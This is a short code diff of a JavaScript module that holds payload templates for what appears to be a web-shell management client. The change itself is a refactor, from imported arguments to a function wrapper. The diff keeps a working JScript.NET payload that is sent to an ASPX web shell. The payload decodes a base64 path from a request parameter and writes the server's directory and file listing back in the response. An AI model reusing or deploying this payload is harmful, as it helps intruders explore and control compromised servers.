@@ -1,10 +1,8 @@
-// 
-// 文件管理模板
-// 
+/**
+ * 文件管理模板
+ */
 
-import { arg1, arg2, arg3 } from './argv';
-
-module.exports = {
+module.exports = (arg1, arg2, arg3) => ({
   dir: {
     _:
       `var D=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{return System.IO.File.GetLastWriteTime(p).ToString("yyyy-MM-dd HH:mm:ss");}for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+"/\t"+T(P)+"\t0\t-\n");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+"\t"+T(P)+"\t"+s[i].Length+"\t-\n");}`,
@@ -78,4 +76,4 @@ module.exports = {
     [arg1]: "#{base64::url}",
     [arg2]: "#{base64::path}"
   }
-}
+})
